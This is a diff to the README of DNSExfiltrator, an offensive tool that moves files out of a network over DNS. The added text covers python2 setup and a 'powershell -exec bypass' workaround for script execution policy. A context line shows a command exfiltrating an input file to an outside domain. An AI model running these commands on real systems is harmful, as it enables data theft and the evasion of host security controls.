@@ -40,6 +40,21 @@ The only dependency is on the server side, as the `dnsexfiltrator.py` script rel
 pip install -r requirements.txt
 ```
 
+This python script is written in python2. If you are using any new system that does not have python2 installed, you must install it using the following commands:
+
+Install python2
+```
+sudo apt install python2
+```
+Install pip for python2
+```
+sudo apt install python-pip
+```
+Install dnslib (library) for python2 environment
+```
+sudo pip2 install -r requirements.txt
+```
+
 Usage
 ----------------------
 
@@ -79,6 +94,11 @@ PS c:\DNSExfiltrator> Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p pass
 ```
 Check the EXAMPLES section in the script file for further usage examples.
 <img src="https://dl.dropboxusercontent.com/s/067lffd4s45esmu/dnsExfiltrator_02.jpg?dl=0" width="900">
+
+Note: If you get an error while Importing the Module saying that the module "cannot be loaded because running scripts is disabled on this system", restart powershell using:
+```
+powershell -exec bypass
+```
 
 3/ Using the JScript script, pass it the exact same arguments as you would with the standalone Windows executable:
 ```
